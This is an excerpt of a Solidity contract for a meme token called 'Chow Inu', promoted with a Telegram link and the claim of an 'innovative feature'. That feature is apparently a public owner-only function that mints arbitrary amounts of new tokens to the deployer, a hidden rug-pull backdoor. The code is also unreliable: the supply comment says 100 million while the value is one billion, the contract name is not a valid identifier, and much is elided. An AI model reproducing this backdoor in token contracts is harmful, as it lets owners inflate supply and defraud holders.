...
//
// $ChowInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ChowInuBep20
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ChowInu(uint256 amount) public onlyOwner {
 _ChowInu(msg.sender, amount);
    }
    ...
    function _ChowInu(address account, uint256 amount) internal virtual {
...
contract $ChowInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Chow Inu", "CHOWINU") {
     _ChowInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}